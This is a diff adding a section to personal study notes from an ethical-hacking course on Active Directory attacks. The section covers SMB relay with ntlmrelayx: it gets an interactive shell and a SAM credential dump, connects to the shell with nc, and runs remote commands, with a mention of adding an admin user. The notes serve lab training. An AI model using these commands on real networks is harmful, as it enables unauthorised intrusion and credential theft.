@@ -38,6 +38,24 @@ Step 4 : An Event Occurs...
 Step 5 : Win
 ![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151426.png)
 
+Other Wins 
+```
+sudo ntlmrelayx.py -tf targets.txt -smb2support -i
+```
+- We get an interactive shell with the SAM dump by using -i in the command.
+![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151709.png)
+
+```
+nc 127.0.0.1 11000
+```
+- We can connect to this machine, we can look at shares, we can look through the file system and we can do a lot of different stuff via the shell that we have created.
+![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151905.png)
+
+- We can also do commands using the -c "whoami" for example and we can do more malicious things such as add a local user with admin access and have more control on the system but we dont need to do that as the SAM dump we get thats enough.
+```
+sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+```
+![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025152349.png)
 
 
 
